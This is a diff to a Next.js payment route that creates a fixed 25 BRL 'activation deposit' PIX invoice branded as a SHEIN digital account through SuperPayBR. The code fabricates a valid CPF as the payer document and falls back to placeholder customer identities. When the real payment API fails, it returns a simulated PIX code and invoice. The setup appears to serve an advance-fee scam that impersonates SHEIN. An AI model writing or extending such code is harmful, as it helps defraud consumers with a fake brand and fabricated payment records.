@@ -1,5 +1,4 @@
 import { type NextRequest, NextResponse } from "next/server"
-import { getSuperPayAccessToken } from "@/lib/superpaybr-auth"
 
 // Função para validar CPF
 function validateCPF(cpf: string): boolean {
@@ -64,23 +63,16 @@ export async function POST(request: NextRequest) {
   try {
     console.log("=== CRIANDO FATURA ATIVAÇÃO SUPERPAYBR ===")
 
-    const body = await request.json()
-    const { amount } = body
+    // Obter access token
+    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
+    const authData = await authResponse.json()
 
-    console.log("Dados ativação recebidos:", { amount })
-
-    if (!amount) {
-      return NextResponse.json(
-        {
-          success: false,
-          error: "Valor de ativação não fornecido",
-        },
-        { status: 400 },
-      )
+    if (!authData.success) {
+      console.log("❌ Falha na autenticação SuperPayBR, usando fallback")
+      return createSimulatedActivationInvoice(request)
     }
 
-    // Obter access token
-    const accessToken = await getSuperPayAccessToken()
+    const { access_token } = authData.data
 
     // Carregar dados do usuário
     const getUserData = () => {
@@ -107,7 +99,7 @@ export async function POST(request: NextRequest) {
           },
         }
       } catch (error) {
-        console.log("⚠️ Erro ao carregar dados do usuário ativação, usando fallback:", error)
+        console.log("⚠️ Erro ao carregar dados do usuário, usando fallback:", error)
         return {
           nome: "Cliente SHEIN",
           cpf: "12345678901",
@@ -134,11 +126,11 @@ export async function POST(request: NextRequest) {
       document = generateValidCPF()
     }
 
-    const totalAmount = Number.parseFloat(amount.toString())
+    const activationAmount = 25.0
     const externalId = `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
     // Preparar payload SuperPayBR para ativação
-    const invoicePayload = {
+    const activationPayload = {
       client: {
         name: userData.nome,
         document: document,
@@ -172,7 +164,7 @@ export async function POST(request: NextRequest) {
             title: "Depósito de Ativação - Conta Digital SHEIN",
             qnt: 1,
             discount: 0,
-            amount: totalAmount,
+            amount: activationAmount,
           },
         ],
       },
@@ -187,9 +179,9 @@ export async function POST(request: NextRequest) {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        Authorization: `Bearer ${accessToken}`,
+        Authorization: `Bearer ${access_token}`,
       },
-      body: JSON.stringify(invoicePayload),
+      body: JSON.stringify(activationPayload),
     })
 
     if (response.ok) {
@@ -220,25 +212,24 @@ export async function POST(request: NextRequest) {
     } else {
       const errorText = await response.text()
       console.log("❌ Erro na API SuperPayBR ativação:", response.status, errorText)
-      return createSimulatedActivationInvoice(request, body)
+      return createSimulatedActivationInvoice(request)
     }
   } catch (error) {
     console.log("❌ Erro ao criar fatura ativação SuperPayBR:", error)
-    const body = await request.json() // Declare body variable here
-    return createSimulatedActivationInvoice(request, body)
+    return createSimulatedActivationInvoice(request)
   }
 }
 
-async function createSimulatedActivationInvoice(request: NextRequest, body: any) {
-  const { amount } = body
-  const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
-  const externalId = `SHEIN_ACT_SIM_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+async function createSimulatedActivationInvoice(request: NextRequest) {
+  const timestamp = Date.now()
+  const externalId = `SHEIN_ACT_SIM_${timestamp}_${Math.random().toString(36).substr(2, 9)}`
+  const activationAmount = 25.0
 
-  const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/ACT${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN ACT5011SAO PAULO62070503***6304ACTS`
+  const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/ACT${timestamp}52040000530398654062500580BR5909SHEIN5011SAO PAULO62070503***6304ACTS`
 
   const simulatedInvoice = {
-    id: `ACT_SIM_${Date.now()}`,
-    invoice_id: `ACT_SIMULATED_${Date.now()}`,
+    id: `SIM_ACT_${timestamp}`,
+    invoice_id: `SIMULATED_ACT_${timestamp}`,
     external_id: externalId,
     pix: {
       payload: simulatedPixCode,
@@ -247,18 +238,18 @@ async function createSimulatedActivationInvoice(request: NextRequest, body: any)
     },
     status: {
       code: 1,
-      title: "Aguardando Pagamento",
+      title: "Aguardando Depósito",
       text: "pending",
     },
     valores: {
-      bruto: Math.round(totalAmount * 100),
-      liquido: Math.round(totalAmount * 100),
+      bruto: Math.round(activationAmount * 100),
+      liquido: Math.round(activationAmount * 100),
     },
     vencimento: {
       dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
     },
     secure: {
-      id: `simulated-act-${Date.now()}`,
+      id: `simulated-act-${timestamp}`,
       url: `${request.nextUrl.origin}/upp/checkout`,
     },
     type: "simulated" as const,
